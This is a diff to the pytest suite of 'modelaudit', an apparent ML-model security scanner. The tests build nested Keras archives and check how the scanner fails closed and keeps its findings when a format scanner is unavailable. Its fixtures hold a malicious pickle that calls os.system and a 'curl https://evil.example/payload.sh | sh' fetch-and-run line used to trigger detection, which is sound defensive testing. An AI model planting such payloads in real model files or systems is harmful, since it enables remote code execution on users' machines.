@@ -17,6 +17,7 @@ from typing import Any, ClassVar, cast
 import pytest
 
 from modelaudit import core
+from modelaudit.analysis.unified_context import UnifiedMLContext
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.cache.optimized_config import build_cache_version_context
 from modelaudit.config import ModelAuditConfig, reset_config, set_config
@@ -40,6 +41,7 @@ from modelaudit.scanners.zip_scanner import (
 )
 from modelaudit.utils.file import detection as file_detection
 from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
+from modelaudit.whitelists import POPULAR_MODELS
 from tests.helpers import (
     create_mock_mxnet_symbol,
     create_mock_onnx,
@@ -3017,6 +3019,117 @@ def test_scan_nested_file_does_not_fail_closed_for_extension_only_member(
     assert not any(check.name == "Format Detection" for check in result.checks)
 
 
+@pytest.mark.parametrize("malicious", [False, True])
+def test_scan_nested_file_fails_closed_and_preserves_generic_keras_zip_findings(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    malicious: bool,
+) -> None:
+    nested_keras = tmp_path / "nested.keras"
+    with zipfile.ZipFile(nested_keras, "w") as archive:
+        archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
+        archive.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
+        if malicious:
+            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')
+
+    original_load_scanner = _registry._load_scanner
+
+    def load_scanner_by_id(scanner_id: str) -> type[BaseScanner] | None:
+        if scanner_id == "keras_zip":
+            return None
+        return original_load_scanner(scanner_id)
+
+    monkeypatch.setattr(_registry, "_load_scanner", load_scanner_by_id)
+
+    result = scan_nested_file(str(nested_keras), {"cache_enabled": False})
+
+    assert result.scanner_name == "zip"
+    assert result.success is False
+    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
+    security_findings = [
+        issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+    ]
+    assert bool(security_findings) is malicious
+    has_pickle_finding = any(
+        issue.rule_code == "S201" and issue.details.get("zip_entry") == "payload.pkl" for issue in result.issues
+    )
+    assert has_pickle_finding is malicious
+
+
+def test_scan_nested_file_reports_unavailable_keras_scanner_when_zip_fallback_is_excluded(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    nested_keras = tmp_path / "nested.keras"
+    with zipfile.ZipFile(nested_keras, "w") as archive:
+        archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
+        archive.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
+    original_load_scanner = _registry._load_scanner
+
+    def load_scanner(scanner_id: str) -> type[BaseScanner] | None:
+        if scanner_id == "keras_zip":
+            return None
+        return original_load_scanner(scanner_id)
+
+    monkeypatch.setattr(_registry, "_load_scanner", load_scanner)
+
+    result = scan_nested_file(
+        str(nested_keras),
+        {"scanners": ["keras_zip"], "cache_enabled": False},
+    )
+
+    assert result.scanner_name == "unknown"
+    assert result.success is False
+    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
+    assert not any(check.name == "Scanner Selection" for check in result.checks)
+
+
+def test_scan_nested_file_unavailable_keras_scanner_restores_whitelist_downgrade(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    nested_keras = tmp_path / "nested.keras"
+    with zipfile.ZipFile(nested_keras, "w") as archive:
+        archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
+        archive.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
+    original_load_scanner = _registry._load_scanner
+
+    def load_scanner(scanner_id: str) -> type[BaseScanner] | None:
+        if scanner_id == "keras_zip":
+            return None
+        return original_load_scanner(scanner_id)
+
+    def scan_with_whitelisted_finding(self: ZipScanner, path: str) -> ScanResult:
+        self.context = UnifiedMLContext(
+            file_path=Path(path),
+            file_size=Path(path).stat().st_size,
+            file_type=".keras",
+            model_id=next(iter(POPULAR_MODELS)),
+            model_source="huggingface",
+        )
+        result = self._create_result()
+        result.add_check(
+            name="Fallback Security Finding",
+            passed=False,
+            message="High confidence fallback anomaly",
+            severity=IssueSeverity.CRITICAL,
+            rule_code="CUSTOM001",
+        )
+        result.finish(success=True)
+        assert result.issues[0].severity == IssueSeverity.INFO
+        return result
+
+    monkeypatch.setattr(_registry, "_load_scanner", load_scanner)
+    monkeypatch.setattr(ZipScanner, "scan", scan_with_whitelisted_finding)
+
+    result = scan_nested_file(str(nested_keras), {"cache_enabled": False})
+
+    assert result.success is False
+    assert result.issues[0].severity == IssueSeverity.CRITICAL
+    assert result.issues[0].details["whitelist_downgrade_restored"] is True
+    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
+
+
 def test_scan_nested_file_fails_closed_when_xml_root_is_beyond_bounded_probe(tmp_path: Path) -> None:
     extracted_member = tmp_path / "payload.txt"
     extracted_member.write_text(
@@ -3146,10 +3259,15 @@ def test_scan_nested_file_merges_torch7_security_analysis_for_signature_valid_bi
 
 def test_scan_nested_file_merges_r_serialized_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
     extracted_member = tmp_path / "payload.bin"
+    elf_header = bytearray(b"\x00" * 64)
+    elf_header[:4] = b"\x7fELF"
+    elf_header[4:7] = b"\x02\x01\x01"
+    elf_header[16:18] = (2).to_bytes(2, "little")
+    elf_header[18:20] = (62).to_bytes(2, "little")
+    elf_header[20:24] = (1).to_bytes(4, "little")
     extracted_member.write_bytes(
         b"RDX3\nX\nworkspace\nmodel\nexpression\nlanguage\n"
-        b"base::system('curl https://evil.example/payload.sh | sh')\n"
-        b"\x7fELF" + b"\x00" * 128
+        b"base::system('curl https://evil.example/payload.sh | sh')\n" + bytes(elf_header) + b"\x00" * 64
     )
 
     result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
@@ -4622,6 +4740,44 @@ def test_scan_zip_fails_closed_when_nested_recognized_header_scanner_is_unavaila
     assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
     nested_check = next(check for check in result.checks if check.name == "Format Detection")
     assert nested_check.location == f"{archive_path}:member.dat"
+
+
+def test_scan_zip_preserves_findings_when_nested_keras_scanner_is_unavailable(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    nested_keras = io.BytesIO()
+    with zipfile.ZipFile(nested_keras, "w") as archive:
+        archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
+        archive.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
+        archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')
+
+    archive_path = tmp_path / "bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("nested.keras", nested_keras.getvalue())
+
+    original_load_scanner = _registry._load_scanner
+
+    def load_scanner(scanner_id: str) -> type[BaseScanner] | None:
+        if scanner_id == "keras_zip":
+            return None
+        return original_load_scanner(scanner_id)
+
+    monkeypatch.setattr(_registry, "_load_scanner", load_scanner)
+
+    result = ZipScanner({"cache_enabled": False}).scan(str(archive_path))
+
+    assert result.success is False
+    assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
+    nested_check = next(check for check in result.checks if check.name == "Format Detection")
+    assert nested_check.location == f"{archive_path}:nested.keras"
+    assert nested_check.details["preferred_scanner_id"] == "keras_zip"
+    assert any(
+        issue.rule_code == "S201"
+        and issue.location == f"{archive_path}:nested.keras:payload.pkl"
+        and issue.details.get("zip_entry") == "nested.keras:payload.pkl"
+        for issue in result.issues
+    )
 
 
 class TestZipScanner:
